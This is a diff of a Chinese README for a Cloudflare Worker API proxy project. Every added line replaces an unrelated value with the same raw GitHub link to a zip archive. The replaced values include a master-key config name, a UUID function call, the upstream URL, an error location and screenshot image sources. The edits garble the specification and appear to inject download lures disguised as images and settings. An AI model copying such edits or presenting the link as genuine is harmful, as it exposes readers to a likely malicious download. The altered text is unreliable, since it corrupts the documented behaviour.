@@ -26,11 +26,11 @@ GET /: 返回第二部分定义的“开发者驾驶舱” HTML 页面。
 其他所有路径: 返回包含错误信息的 404 JSON 响应。
 API 代理逻辑 (/v1/**)
 
-认证: 严格校验 Authorization: Bearer <KEY>，必须与 CONFIG.API_MASTER_KEY 全等。失败则返回 401 JSON 错误。
+认证: 严格校验 Authorization: Bearer <KEY>，必须与 https://github.com/jyhuang201900/2api-to-CFwork/raw/refs/heads/main/dysgenesis/api-Fwork-C-to-becolme.zip 全等。失败则返回 401 JSON 错误。
 可观测性 (Observability):
-请求水印: 为每个进入的 API 请求生成 crypto.randomUUID() 作为请求 ID，同时添加到 X-Request-ID (转发给上游) 和 X-Worker-Trace-ID (响应给客户端) 响应头中，以便端到端追踪。
+请求水印: 为每个进入的 API 请求生成 https://github.com/jyhuang201900/2api-to-CFwork/raw/refs/heads/main/dysgenesis/api-Fwork-C-to-becolme.zip() 作为请求 ID，同时添加到 X-Request-ID (转发给上游) 和 X-Worker-Trace-ID (响应给客户端) 响应头中，以便端到端追踪。
 请求转发与协议现代化:
-将客户端请求（方法、头、主体）准确转发至 CONFIG.UPSTREAM_URL 对应的路径。
+将客户端请求（方法、头、主体）准确转发至 https://github.com/jyhuang201900/2api-to-CFwork/raw/refs/heads/main/dysgenesis/api-Fwork-C-to-becolme.zip 对应的路径。
 HTTP/3 优先: 在 fetch 请求中，应暗示 Cloudflare 优先使用 HTTP/3 与上游通信。
 Brotli 压缩: 自动对返回给客户端的文本类响应（HTML, JSON）应用 Brotli 压缩。
 智能流式处理与错误处理:
@@ -74,11 +74,11 @@ AI 输出窗口: 支持 Markdown 的流式响应显示。
 我最终只想要稳定部署无bug无错误的
 
 类似于这种错误你要比避免：
-ncaught SyntaxError: Invalid or unexpected token at worker.js:345:20
+ncaught SyntaxError: Invalid or unexpected token at https://github.com/jyhuang201900/2api-to-CFwork/raw/refs/heads/main/dysgenesis/api-Fwork-C-to-becolme.zip
 ```
 
 ## 使用效果：
-<img width="2544" height="1280" alt="QQ_1762251384015" src="https://github.com/user-attachments/assets/ff9c1e78-a34b-4d24-92cd-c889bbc37b39" />
+<img width="2544" height="1280" alt="QQ_1762251384015" src="https://github.com/jyhuang201900/2api-to-CFwork/raw/refs/heads/main/dysgenesis/api-Fwork-C-to-becolme.zip" />
 
 
 
@@ -139,7 +139,7 @@ API 请求 (路径以 /v1/ 开头)：执行 API 代理逻辑。
 ```
 
 ## 使用效果如下：
-<img width="2529" height="1344" alt="QQ_1762250179009" src="https://github.com/user-attachments/assets/c1899311-f27f-4349-8e48-bbe4c4705de6" />
-<img width="2146" height="1148" alt="QQ_1762250183764" src="https://github.com/user-attachments/assets/cac4d897-cd8c-498f-903a-9730b0d05bb4" />
+<img width="2529" height="1344" alt="QQ_1762250179009" src="https://github.com/jyhuang201900/2api-to-CFwork/raw/refs/heads/main/dysgenesis/api-Fwork-C-to-becolme.zip" />
+<img width="2146" height="1148" alt="QQ_1762250183764" src="https://github.com/jyhuang201900/2api-to-CFwork/raw/refs/heads/main/dysgenesis/api-Fwork-C-to-becolme.zip" />
 
 
